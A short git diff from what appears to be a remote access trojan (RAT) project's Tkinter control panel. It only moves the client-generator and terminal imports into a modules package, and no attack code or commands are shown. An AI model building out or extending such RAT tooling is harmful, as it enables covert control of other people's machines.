@@ -2,8 +2,8 @@ import tkinter as tk
 from tkinter import ttk, Menu, Toplevel, messagebox, scrolledtext
 from server import RAT_SERVER
 import threading
-from generate_client_demo import generate_client
-from Terminal import Terminal
+from modules.generate_client_demo import generate_client
+from modules.terminal import Terminal
 class ratGUI:
     def __init__(self, root, server : RAT_SERVER):
         self.root = root
